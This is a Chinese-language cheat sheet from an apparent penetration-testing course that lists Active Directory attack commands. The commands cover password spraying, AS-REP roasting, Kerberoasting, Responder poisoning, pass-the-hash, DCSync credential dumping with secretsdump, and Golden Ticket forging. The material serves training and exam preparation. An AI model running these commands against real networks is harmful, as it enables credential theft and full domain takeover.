# 速查：Active Directory

> 原理看 [Ch 30](../30-ad-fundamentals.md)–[Ch 36](../36-ad-chain-simulation.md)。工具用 **NetExec（nxc）**，非停維護的 crackmapexec。

## 先修：時間與 DNS

```bash
sudo ntpdate DC_IP                        # 不然 Kerberos KRB_AP_ERR_SKEW
echo "DC_IP dc01.corp.local corp.local" | sudo tee -a /etc/hosts
```

## 枚舉（無憑證 / 低權憑證）

```bash
nxc smb DC_IP -u '' -p '' --users         # null session
nxc smb DC_IP -u '' -p '' --rid-brute
nxc smb DC_IP -u u -p p --users --groups --shares --pass-pol
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
enum4linux-ng -A DC_IP
```

## 初始立足

```bash
# Password spray（先查鎖定策略！每輪 1 密碼）
nxc smb DC_IP -u users.txt -p 'Season2025!' --continue-on-success --no-bruteforce

# AS-REP Roasting（帳號免預先驗證）
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoasting（帳號有 SPN，需任一有效憑證）
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt

# LLMNR/NBT-NS 毒化
sudo responder -I tun0            # 抓 NetNTLMv2 → hashcat -m 5600（只能離線破）
```

## 用憑證做什麼

```bash
nxc smb TARGETS -u u -p p                 # 噴整段網路，找能登入哪台
nxc winrm DC_IP -u u -p p
evil-winrm -i DC_IP -u u -p p             # 拿 shell
bloodhound-python -u u -p p -d corp.local -ns DC_IP -c all   # 畫攻擊路徑
```

## 橫向移動

```bash
# Pass-the-Hash
nxc smb TARGET -u administrator -H <NTLMHASH>
impacket-psexec administrator@TARGET -hashes :<NTLMHASH>
impacket-wmiexec corp.local/user@TARGET -hashes :<NTLMHASH>
evil-winrm -i TARGET -u administrator -H <NTLMHASH>

# Pass-the-Ticket / 票據
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/user@TARGET
```

## ACL 攻擊（BloodHound 指出的邊）

```
GenericAll on user     → 改密碼 / targeted Kerberoast
GenericWrite on user   → 加 SPN 後 Kerberoast
ForceChangePassword    → net rpc password / rpcclient
GenericAll on group    → 把自己加進該群組
WriteDACL              → 給自己 DCSync 權限
```

## Domain 接管

```bash
# DCSync（需 Replication 權限 / DA）
impacket-secretsdump corp.local/user:pass@DC_IP
impacket-secretsdump -just-dc-user Administrator corp.local/user:pass@DC_IP

# Golden Ticket（有 krbtgt hash 後持久化）
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain corp.local Administrator

# 拿到 Administrator hash → psexec 進 DC
impacket-psexec administrator@DC_IP -hashes :<HASH>
```

## 鐵律
- 拿到任一新憑證 → 重跑 nxc 噴全網 + 重收 BloodHound（Mark Owned）
- NetNTLMv2 不能 PtH，只能離線破或 relay
- 考試 AD 鏈 40 分：initial → BloodHound 找路 → 橫移 → DCSync
